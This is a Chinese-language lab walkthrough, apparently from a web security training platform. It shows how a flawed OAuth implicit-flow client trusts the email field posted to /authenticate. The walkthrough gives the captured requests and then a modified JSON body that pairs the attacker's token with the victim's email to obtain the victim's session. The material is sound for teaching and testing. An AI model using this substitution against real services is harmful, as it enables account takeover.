# 实验：通过 OAuth 隐式流程绕过身份验证

本实验使用 OAuth 服务允许用户使用其社交媒体账户登录。客户端应用程序的验证存在缺陷，使得攻击者可以在不知道密码的情况下登录其他用户的账户。

要解决本实验，请登录 Carlos 的账户。他的电子邮件地址是 `carlos@carlos-montoya.net`。

您可以使用以下凭据登录您自己的社交媒体账户：`wiener:peter`。

## 步骤

使用 OAuth 登录功能
- 观察初始请求
    ```http
    GET /auth?client_id=xqcknm7slve0cw6kxz7pa&redirect_uri=https://id.web-security-academy.net/oauth-callback&response_type=token&nonce=-1910104141&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-id.oauth-server.net
    ```
    - `response_type=token` 
        app 使用隐式授权类型

- 在一系列中间步骤后，观察回调过程
    - 授权服务器
        ```http
        HTTP/2 302 Found
        Location: https://id.web-security-academy.net/oauth-callback#access_token=Sbw-VdPZMAkf4eiGcth90wb02tPXNkx1dh_CcHIQOr9&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
        ```
        - 预期行为：授权服务器使用 hash 片段传递令牌
    
    - 浏览器请求
        ```http
        GET /oauth-callback HTTP/2
        ```

    - 应用程序响应
        ```html
        <script>
            const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
            const token = urlSearchParams.get('access_token');
            fetch('https://oauth-id.oauth-server.net/me', {
                    method: 'GET',
                    headers: {
                        'Authorization': 'Bearer ' + token,
                        'Content-Type': 'application/json'
                    }
                })
                .then(r => r.json())
                .then(j =>
                    fetch('/authenticate', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            email: j.email,
                            username: j.sub,
                            token: token
                        })
                    }).then(r => document.location = '/'))
        </script>
        ```
        - 预期行为：
            - 浏览器使用 JS 从授权服务器设置的 hash 片段中提取令牌
            - 浏览器使用授权令牌，从授权服务器拉取信息
        
        - 待测试行为：
            - 浏览器将拉取到的信息以 JSON 格式发送到应用程序端点 `/authenticate`
                ```http
                POST /authenticate HTTP/2
                Host: id.web-security-academy.net

                {
                    "email":"wiener@hotdog.com",
                    "username":"wiener",
                    "token":"Sbw-VdPZMAkf4eiGcth90wb02tPXNkx1dh_CcHIQOr9"
                }
                ```

            - 应用程序返回会话 cookie
                ```http
                HTTP/2 302 Found
                Location: /
                Set-Cookie: session=cexcNh8HnslkCYG0N4gZIenVhtwLncLV; Secure; HttpOnly; SameSite=None
                ```

对浏览器发送授权令牌到应用程序这一步进行测试
- 修改请求体，删除用户名字段
    ```json
    {
        "email":"wiener@hotdog.com",
        "token":"Sbw-VdPZMAkf4eiGcth90wb02tPXNkx1dh_CcHIQOr9"
    }
    ```
    - 仍可成功返回会话 cookie

- 修改邮件字段
    ```json
    {
        "email":"carlos@carlos-montoya.net",
        "token":"Sbw-VdPZMAkf4eiGcth90wb02tPXNkx1dh_CcHIQOr9"
    }
    ```
    - 成功返回会话 cookie
    - 应用此 cookie 后访问账户端点
        - 成功访问目标用户 carlos 的账户页面
